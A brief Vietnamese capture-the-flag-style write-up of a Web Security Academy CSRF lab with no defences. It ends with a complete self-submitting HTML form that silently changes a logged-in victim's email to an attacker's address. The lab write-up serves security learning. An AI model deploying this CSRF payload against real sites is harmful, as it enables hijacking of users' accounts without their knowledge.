## Lỗ hổng CSRF không có biện pháp phòng thủ 
* Ở lab này mục đích của tôi là ép lừa 1 người khác tự thay đổi địa chỉ email của họ sang email mà tôi chỉ định, mà họ không hề hay biết.
* Tại sao lab này lại ghi là "No defenses".
* Thông thường các trang web có bảo mật tốt sẽ có 1 lớp bảo vệ gọi là CSRF TOKEN (một dãy ngẫu nhiên khó đoán)
* Đầu tiên tôi vào tôi thấy được nó có 1 chức năng thay đổi email
* Thử thay đổi email của trường này và bắt lấy request đấy.
* <img width="867" height="466" alt="image" src="https://github.com/user-attachments/assets/10c5f322-d10d-40f8-bea3-0514c2ce916f" />
* <pre><html>
  <body>
    <script>
      // Tự động submit form ngay khi trang web được load
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
    <form action="https://0ad000ee035b89e082658d150021000b.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="hacker@evil-user.net" />
      <input type="submit" value="Submit request" />
    </form>
  </body>
</html>
</pre>
